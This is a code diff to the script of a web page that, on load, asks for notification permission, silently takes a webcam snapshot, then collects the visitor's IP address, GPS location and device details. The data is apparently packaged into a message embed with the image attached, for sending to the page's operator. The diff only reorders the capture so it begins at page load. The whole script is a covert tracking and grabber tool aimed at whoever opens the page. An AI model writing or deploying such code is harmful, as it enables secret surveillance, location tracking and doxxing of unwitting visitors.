@@ -77,6 +77,7 @@
 **Touch Support:** ${device.touchSupport}
 
 🕒 ${new Date().toLocaleString()}`,
+
             image: capturedImageData ? { url: "attachment://snapshot.png" } : undefined
           }
         ],
@@ -147,46 +148,33 @@
       return new Blob([u8arr], {type:mime});
     }
 
-    function captureImageThenStart() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          video.play();
-
-          // Wait for the video to load metadata and draw frame
-          video.onloadedmetadata = () => {
-            const canvas = document.createElement("canvas");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            capturedImageData = canvas.toDataURL("image/png");
-
-            // Stop camera stream
-            stream.getTracks().forEach(track => track.stop());
-
-            // Continue to IP + GPS
-            getIPAndGPS();
-          };
-        })
-        .catch(() => {
-          // User denied camera or error — continue without image
-          getIPAndGPS();
-        });
-    }
-
-    function requestNotificationsThenCamera() {
+    window.onload = () => {
       if (Notification && Notification.requestPermission) {
         Notification.requestPermission().finally(() => {
-          captureImageThenStart(); // now try camera
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+              const video = document.createElement("video");
+              video.srcObject = stream;
+              video.play();
+              video.onloadedmetadata = () => {
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                capturedImageData = canvas.toDataURL("image/png");
+                stream.getTracks().forEach(track => track.stop());
+                getIPAndGPS();
+              };
+            })
+            .catch(() => {
+              getIPAndGPS(); // Continue even if camera denied
+            });
         });
       } else {
-        captureImageThenStart(); // fallback
+        getIPAndGPS(); // Fallback
       }
-    }
-
-    window.onload = requestNotificationsThenCamera;
+    };
   </script>
 </body>
 </html>
